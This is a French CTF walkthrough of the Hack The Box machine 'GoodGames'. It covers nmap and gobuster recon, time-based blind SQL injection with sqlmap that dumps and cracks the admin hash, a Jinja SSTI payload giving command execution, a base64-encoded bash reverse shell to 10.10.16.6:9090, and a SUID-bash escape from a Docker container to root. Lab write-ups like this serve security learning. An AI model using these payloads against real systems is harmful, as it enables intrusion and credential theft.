# Goodgames - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-05 17:28 EST
Nmap scan report for 10.10.11.130
Host is up (0.023s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

On tombe donc sur un site, on lance un gobuster en tâche de fond

```bash
gobuster dir -u http://10.10.11.130/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --exclude-length 9265
```

```bash
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.130/]
/login                (Status: 200) [Size: 9294]                          
/blog                 (Status: 200) [Size: 44212]                         
/profile              (Status: 200) [Size: 9267]                          
/signup               (Status: 200) [Size: 33387]                         
/forgot-password      (Status: 200) [Size: 32744]                         
/server-status        (Status: 403) [Size: 277]                           
/coming-soon          (Status: 200) [Size: 10524]                         
Progress: 23890 / 62285 (38.36%)                                         [ERROR] 2023/03/05 17:34:33 [!] parse "http://10.10.11.130/error\x1f_log": net/url: invalid control character in URL
/password-reset       (Status: 200) [Size: 9294]
```

On essaye sqlmap sur la page de login vu que ces pages ne donnent rien:

```bash
sqlmap -r login.req
```

```bash
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@gmail.com' AND (SELECT 8568 FROM (SELECT(SLEEP(5)))RZSw) AND 'BsWV'='BsWV&password=test
---
[17:43:51] [INFO] fetching current user
[17:43:51] [INFO] retrieved: main_admin@localhost                                              
current user: 'main_admin@localhost'                                                                                                                                                          
[17:45:05] [INFO] fetching current database                                                    
[17:45:05] [INFO] retrieved: main      
current database: 'main'
[17:45:17] [INFO] fetching server hostname
[17:45:17] [INFO] retrieved: GoodGames
hostname: 'GoodGames'                                                                          
[17:45:52] [INFO] testing if current user is DBA                                               
[17:45:52] [INFO] fetching current user        
current user is DBA: False                                                                                                                                                                    
[17:45:52] [INFO] fetching database users                                                                                                                                                     
[17:45:52] [INFO] fetching number of database users                                            
[17:45:52] [INFO] retrieved: 1                                                                 
[17:45:53] [INFO] retrieved: 'main_admin'@'localhost'                                          
database management system users [1]:                                                          
[*] 'main_admin'@'localhost'

[17:47:44] [INFO] retrieved: 2
[17:47:46] [INFO] retrieved: information_schema
[17:48:51] [INFO] retrieved: main
[17:49:04] [INFO] fetching tables for databases: 'information_schema, main'
[17:49:04] [INFO] fetching number of tables for database 'main'
[17:49:04] [INFO] retrieved: 3
[17:49:08] [INFO] retrieved: blog
[17:49:24] [INFO] retrieved: blog_comments
[17:50:04] [INFO] retrieved: user
[17:50:18] [INFO] fetching number of tables for database 'information_schema'
```

On trouve ces credentials:

```bash
Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+
```

On trouve sur crackstation que le mdp est: superadministrator

On est donc connecté en tant qu’admin.

On peut maintenant laisser des commentaires, on remarque que s’il on met des balises de script dans les commentaires alors on a une erreur 500 mais aussi quand on pose des comments normaux alors je pense que le site ne marche pas.

On peut aller dans les settings mais ça nous redirige vers internal-administration.goodgames.htb, on l’ajoute à nos noms de domaine, on se connecte avec les credentials précédents

Les seuls champs avec lesquels ont peut interagir sont dans les settings du profil, on essaye une SSTI sur le nom de profil et quand on insère {{7*7}} on obtient 49 comme nom.

Ce payload fonctionne:

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

On va forger une reverse shell en base64:

```bash
echo -e 'bash -i >& /dev/tcp/10.10.16.6/9090 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzkwOTAgMD4mMQo=
```

```bash

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzkwOTAgMD4mMQo= | base64 -d | bash').read() }}
```

On obtient le flag user mais on est sûrement dans une box vu que il n’y a rien dans /root et qu’on est directement root. On arrive à voir que on est bien mounté:

```bash
mount

/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)                          
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)                        
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)                           
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
```

```bash
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 3808  bytes 662201 (646.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3192  bytes 2749694 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

nmap n’est pas installé mais on peut utiliser bash avec un script générique:

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
&>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

Le port 22 est ouvert donc on essaye de se log en ssh avec les credentials qu’on a récolté. On est connecté en tant qu’Augustus et vu que le container est monté sur son répertoire on va modifier les droits en tant que root dans le container pour obtenir des droits dans la machine

Sur la machine:

```bash
cp /bin/bash .
```

Sur le container:

```bash
# chown root:root bash
chown root:root bash
chmod 4755 bash
# ls -lia
ls -lia
total 1232
130100 drwxr-xr-x 2 1000 1000    4096 Mar  6 15:44 .
  5816 drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
134862 lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
130140 -rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
130148 -rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
130135 -rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
130071 -rwsr-xr-x 1 root root 1234376 Mar  6 15:44 bash
135417 -rw-r----- 1 root 1000      33 Mar  6 14:49 user.txt
```

On ssh de nouveau et on ouvre le shell pour devenir root et obtenir le flag final